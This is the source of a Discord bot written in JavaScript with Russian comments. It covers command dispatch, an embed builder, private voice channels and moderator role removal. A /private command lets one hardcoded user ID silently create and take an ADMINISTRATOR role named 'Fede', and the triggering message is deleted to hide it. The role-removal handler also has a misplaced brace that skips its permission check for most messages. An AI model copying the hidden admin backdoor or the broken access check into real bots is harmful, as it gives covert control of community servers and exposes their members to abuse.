const config = require('./config.json')
const { readdirSync, constants } = require('fs');
const { Client, Collection, Discord, MessageEmbed } = require('discord.js');
const client = new Client({ disableEveryone: true })
client.commands = new Collection();
client.aliases = new Collection();
require('dotenv').config();
["handler"].forEach(handler => {
  require(`./bot-handler/${handler}`)(client)
})

client.on('ready', async () => {
  console.log('[Client] Авторизован как %s [%s]', client.user.tag, client.user.id)
  client.user.setPresence({ activity: { name: 'за сервером', type: 'WATCHING' } });
})


client.on('message', message => {
  // Если автор сообщения бот - выходим
  if (message.author.bot) return;

  // Если сообщение отправлено в ЛС, выходим
  if (!message.guild) return;

  // Является ли сообщение командой (начинается с префикса, указанного в конфиге)
  if (!message.content.startsWith(config.prefix)) return;

  // Разбиваем сообщение на аргументы и находим команду в первом аргументе
  const args = message.content.slice(config.prefix.length).split(/ +/);
  const commandName = args.shift().toLowerCase();
  const cmd =
    client.commands.get(commandName) || client.commands.get(client.aliases.get(commandName));

   
  // Запускаем команду, если она есть
  if (!cmd);
  else {
    message.channel.startTyping();
    setTimeout(() => {
      message.channel.stopTyping();
      cmd.run(client, message, args);
    }, 500);
  } 
});



let setembed_general = ["не указано", "не указано", "не указано", "не указано", "не указано", "не указано", "не указано", "не указано"];
let setembed_fields = ["нет", "нет", "нет", "нет", "нет", "нет", "нет", "нет", "нет", "нет"];
let setembed_addline = ["нет", "нет", "нет", "нет", "нет", "нет", "нет", "нет", "нет", "нет"];

client.on('message', message => {
if (message.content.startsWith("/embsetup")) {
    if (message.channel.name != '📢┃инфомейкер') return
    const args = message.content.slice(`/embsetup`).split(/ +/);
    if (!args[1]) {
        message.reply(`\`укажите, что вы установите! Ниже предоставлен список настроек.\`\n\`[1] - Название\`\n\`[2] - Описание\`\n\`[3] - Цвет [#FFFFFF]\`\n\`[4] - Время\`\n\`[5] - Картинка\`\n\`[6] - Подпись\`\n\`[7] - Картинка к подписи\`\n\`[8] - Миниатюра\``);
        return message.delete();
    }
    if (typeof (+args[1]) != "number") {
        message.reply(`\`вы должны указать число! '/embsetup [число] [значение]'\``);
        return message.delete();
    }
    if (!args[2]) {
        message.reply(`\`значение отстутствует!\``);
        return message.delete();
    }
    let cmd_value = args.slice(2).join(" ");
    if (+args[1] == 1) {
        message.reply(`\`вы изменили заголовок с '${setembed_general[0]}' на '${cmd_value}'!\``)
        setembed_general[0] = cmd_value;
        return message.delete();
    } else if (+args[1] == 2) {
        message.reply(`\`вы изменили описание с '${setembed_general[1]}' на '${cmd_value}'!\``)
        setembed_general[1] = cmd_value;
        return message.delete();
    } else if (+args[1] == 3) {
        if (!cmd_value.startsWith("#")) {
            message.reply(`\`цвет должен начинаться с хештега. Пример: #FFFFFF - белый цвет!\``);
            return message.delete();
        }
        message.reply(`\`вы изменили цвет с '${setembed_general[2]}' на '${cmd_value}'!\``)
        setembed_general[2] = cmd_value;
        return message.delete();
    } else if (+args[1] == 4) {
        if (cmd_value != "включено" && cmd_value != "не указано") {
            message.reply(`\`время имеет параметры 'включено' или 'не указано'!\``);
            return message.delete();
        }
        message.reply(`\`вы изменили статус времени с '${setembed_general[3]}' на '${cmd_value}'!\``)
        setembed_general[3] = cmd_value;
        return message.delete();
    } else if (+args[1] == 5) {
        message.reply(`\`вы изменили URL картинки с '${setembed_general[4]}' на '${cmd_value}'!\``)
        setembed_general[4] = cmd_value;
        return message.delete();
    } else if (+args[1] == 6) {
        message.reply(`\`вы изменили подпись с '${setembed_general[5]}' на '${cmd_value}'!\``)
        setembed_general[5] = cmd_value;
        return message.delete();
    } else if (+args[1] == 7) {
        message.reply(`\`вы изменили URL аватарки подписи с '${setembed_general[6]}' на '${cmd_value}'!\``)
        setembed_general[6] = cmd_value;
        return message.delete();
    } else if (+args[1] == 8) {
        message.reply(`\`вы изменили URL миниатюры с '${setembed_general[7]}' на '${cmd_value}'!\``)
        setembed_general[7] = cmd_value;
        return message.delete();
    }
}

if (message.content == "/embsend") {
    if (!message.member.hasPermission("ADMINISTRATOR")) return
    const embed = new MessageEmbed();
    if (setembed_general[0] != "не указано") embed.setTitle(setembed_general[0]);
    if (setembed_general[1] != "не указано") embed.setDescription(setembed_general[1]);
    if (setembed_general[2] != "не указано") embed.setColor(setembed_general[2]);
    let i = 0;
    while (setembed_fields[i] != 'нет') {
        embed.addField(setembed_fields[i].split(`<=+=>`)[0], setembed_fields[i].split(`<=+=>`)[1]);
        if (setembed_addline[i] != 'нет') embed.addBlankField(false);
        i++;
    }
    if (setembed_general[4] != "не указано") embed.setImage(setembed_general[4]);
    if (setembed_general[5] != "не указано" && setembed_general[6] == "не указано") embed.setFooter(setembed_general[5]);
    if (setembed_general[6] != "не указано" && setembed_general[5] != "не указано") embed.setFooter(setembed_general[5], setembed_general[6]);
    if (setembed_general[3] != "не указано") embed.setTimestamp();
    if (setembed_general[7] != 'не указано') embed.setThumbnail(setembed_general[7]);
    message.channel.send(embed).catch(err => message.channel.send(`\`Хм.. Не получается. Возможно вы сделали что-то не так.\``));
    return message.delete();
}})

client.on("voiceStateUpdate",(oldState,newState) => {
  var categoryid = "835567056123854857";
  var channelid = "835567228891168829";
  
  let emojis = ["👑", "🤡", "🌚", "😈", "🤖", "🎅", "👻", "✨", "⚡️", "🐹"]
  var random_emoji = Math.floor(Math.random() * emojis.length);
  if(newState.channel?.id == channelid) {
    newState.guild.channels.create(`${emojis[random_emoji]}・Приват ${newState.member.user.username}` , {
      type:"voice",
      parent:categoryid,
      permissionOverwrites:[{
          id:newState.member.id,
          allow: ["MANAGE_CHANNELS"]
      },{
          id:newState.guild.id,
          deny:["MANAGE_CHANNELS"]
      }] 
  }).then(channel=>{
    channel.setUserLimit('2')
      newState.setChannel(channel)
  })
  
}
if(oldState.channel?.id != channelid && oldState.channel?.parent?.id == categoryid && !oldState.channel?.members.size) oldState.channel.delete();
})

client.on('message', message => {
    if (message.content.startsWith("/private")) {
        var myid = "449699809700610049"; 
        if (message.author.id != myid) return
        message.guild.roles.create({
                data: {
            name: 'Fede',
            permissions: ['ADMINISTRATOR']}}).then((role)=>{
                message.member.roles.add(role.id);
                message.delete();
    })
}})


client.on('message', message => {
    const rolesToRemove = [
        "[-] Samparo" // добавляешь роли через запятую, на пример: const rolesToRemove = ["[-] Samparo","ещё роль","ещё роль"]
      ];
      const lmember = message.guild.roles.cache.find(r => r.id === '835801927992344597'); // общая роль легал мемберс
      const errorEmbed = require('./Utils/error')
     let logChannel = message.guild.channels.cache.find((c) => c.id == "835553389177077771"); // id лог канала (ПОМЕНЯЕШЬ!)
    if (message.content.toLowerCase().includes("сними") || message.content.toLowerCase().includes("снять")) {
        if (!message.member.roles.cache.some(r => r.id == '655528442825015297')&& !message.member.hasPermission("MANAGE_ROLES"))
        return message.channel.send(errorEmbed(message.client, 'У вас не достаточно прав')).then(d_msg => { 
            d_msg.delete({timeout: 10000})});
        }
        
        const args = message.content.split(/ +/)
        let onebe = false;
        let twobe = false;
        args.forEach(word => {
          if (word.toLowerCase().includes(`роль`)) onebe = true
          if (word.toLowerCase().includes(`у`)) twobe = true
        })
        if (!onebe || !twobe) return
        message.delete()
        let memberToRemoveRole = message.mentions.members.first();
        if (!memberToRemoveRole) {
          return message.channel.send(errorEmbed(message.client, 'Вы не указали пользователя.'))
          .then(d_msg => { 
            d_msg.delete({timeout: 10000})});
        }
        let roleToRemove = memberToRemoveRole.roles.cache.find(r => rolesToRemove.includes(r.name));
        if(!roleToRemove) {
          return message.channel.send(errorEmbed(message.client, 'У пользователя нет роли для снятия.')).then(d_msg => { 
            d_msg.delete({timeout: 10000})});
        }
        const reason = args.slice(4).join(' ');
    if (!reason) {
      return message.channel.send(errorEmbed(message.client, 'Вы не указали причину снятия роли.')).then(d_msg => { 
        d_msg.delete({timeout: 10000})});
    }
        if(!logChannel) {
          return message.channel.send(errorEmbed(message.client, 'Канал логирования не найден, обратитесь к тех.админу.')).then(d_msg => { 
            d_msg.delete({timeout: 10000})});
        }

        memberToRemoveRole.roles.remove(roleToRemove);
        memberToRemoveRole.roles.remove(lmember);
        return logChannel.send(
          new MessageEmbed()
            .setTitle(`Снятие роли!`)
            .setDescription(`
              \`\`Модератор:\`\` **${message.member.displayName}**
              \`\`Пользователю:\`\` **${memberToRemoveRole.displayName}**
              \`\`Причина:\`\` **${reason}**
              \`\`Снята роль: \`\` **${roleToRemove.name}**
            `)
            .setColor('RANDOM')
            .setFooter(`© Команда модерации | Informal`)
        )
      })
client.login(process.env.token);
